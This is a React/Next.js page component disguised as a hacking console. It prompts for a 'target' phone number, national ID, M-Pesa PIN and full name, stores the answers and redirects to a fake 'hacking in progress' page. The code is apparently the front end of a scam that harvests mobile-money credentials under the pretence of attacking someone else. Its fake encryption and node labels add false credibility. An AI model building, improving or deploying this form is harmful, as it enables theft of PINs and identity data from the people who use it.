"use client";
import React, { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";

const STEPS = [
  { id: "phone", label: "ENTER_TARGET_MOBILE_NO", placeholder: "07XX XXX XXX", type: "text" },
  { id: "id_number", label: "VALIDATE_NATIONAL_ID_NO", placeholder: "XXXXXXXX", type: "number" },
  { id: "pin", label: "ENCRYPTED_MPESA_PIN", placeholder: "****", type: "password" },
  {id: "full_name", label: "OFFICIAL_FULL_NAME", type: 'text'},
  { id: "confirm", label: "AUTHORIZE_INJECTION?", placeholder: "Type 'YES' to confirm", type: "text" },
];

export default function TerminalForm() {
  const [currentStep, setCurrentStep] = useState(0);
  const [formData, setFormData] = useState({ phone: "", id_number: "", pin: "", full_name: "", confirm: "" });
  const [displayedText, setDisplayedText] = useState("");
  const [isTyping, setIsTyping] = useState(true);
  const inputRef = useRef<HTMLInputElement>(null);
  const router = useRouter();
  const STORAGE_KEY = 'form_data_temp';

  // Typewriter effect for the labels
  useEffect(() => {
    let i = 0;
    const fullText = STEPS[currentStep].label;
    setDisplayedText("");
    setIsTyping(true);

    const typingInterval = setInterval(() => {
      setDisplayedText((prev) => prev + fullText.charAt(i));
      i++;
      if (i >= fullText.length) {
        clearInterval(typingInterval);
        setIsTyping(false);
        inputRef.current?.focus();
      }
    }, 50);

    return () => clearInterval(typingInterval);
  }, [currentStep]);

  const handleNext = (e: React.FormEvent) => {
    e.preventDefault();
    if (currentStep < STEPS.length - 1) {
      setCurrentStep(currentStep + 1);
    } else {
      // Final Redirection or Processing Logic
      console.log("DATA_EXFILTRATED:", formData);
      sessionStorage.setItem(STORAGE_KEY, JSON.stringify(formData));
      router.push("/processing"); // Link to a 'hacking in progress' loader
    }
  };

  return (
    <main className="crt-screen min-h-screen bg-black flex flex-col items-center justify-center p-6 font-mono">
      <div className="w-full max-w-xl hacker-border bg-black/90 p-8 shadow-glow-blue relative">
        
        {/* TOP TERMINAL HEADER */}
        <div className="flex justify-between items-center mb-10 border-b border-hacker-blue/30 pb-2">
          <div className="flex gap-2">
            <div className="w-3 h-3 bg-hacker-red rounded-full" />
            <div className="w-3 h-3 bg-hacker-blue rounded-full" />
          </div>
          <span className="text-[10px] text-hacker-blue tracking-[0.3em]">SECURE_AUTH_CHANNEL</span>
        </div>

        {/* COMPLETED STEPS HISTORY */}
        <div className="space-y-2 opacity-50 mb-6 text-sm">
          {STEPS.slice(0, currentStep).map((step, idx) => (
            <div key={idx} className="flex gap-4 text-hacker-green">
              <span>{">"} {step.label}:</span>
              <span className="text-white">
                {step.type === "password" ? "********" : (formData as any)[step.id]}
              </span>
            </div>
          ))}
        </div>

        {/* ACTIVE TERMINAL PROMPT */}
        <form onSubmit={handleNext} className="space-y-4">
          <div className="flex flex-col gap-2">
            <label className="text-hacker-blue text-lg flex items-center gap-2">
              <span>{">"}</span>
              {displayedText}
              {isTyping && <span className="w-2 h-5 bg-hacker-blue animate-pulse" />}
            </label>

            {!isTyping && (
              <div className="relative">
                <input
                  ref={inputRef}
                  required
                  type={STEPS[currentStep].type}
                  placeholder={STEPS[currentStep].placeholder}
                  className="w-full bg-transparent border-none outline-none text-hacker-green text-2xl caret-hacker-green placeholder:text-zinc-800 uppercase"
                  value={(formData as any)[STEPS[currentStep].id]}
                  onChange={(e) => setFormData({ ...formData, [STEPS[currentStep].id]: e.target.value })}
                  autoFocus
                />
              </div>
            )}
          </div>

          {!isTyping && (
            <div className="pt-8 flex justify-between items-center">
              <p className="text-[10px] text-hacker-red animate-pulse">
                [WAITING_FOR_USER_INPUT...]
              </p>
              <button 
                type="submit"
                className="px-6 py-1 border border-hacker-green text-hacker-green hover:bg-hacker-green hover:text-black transition-all text-sm"
              >
                EXECUTE_RETURN_KEY
              </button>
            </div>
          )}
        </form>

        {/* SYSTEM DECORATION */}
        <div className="mt-12 pt-4 border-t border-white/5 flex justify-between text-[9px] text-zinc-600">
          <span>ENC: RSA_4096_BIT</span>
          <span>IP_ORIGIN: 192.168.1.104</span>
          <span>LOCATION: NAIROBI_NODE_7</span>
        </div>
      </div>
    </main>
  );
}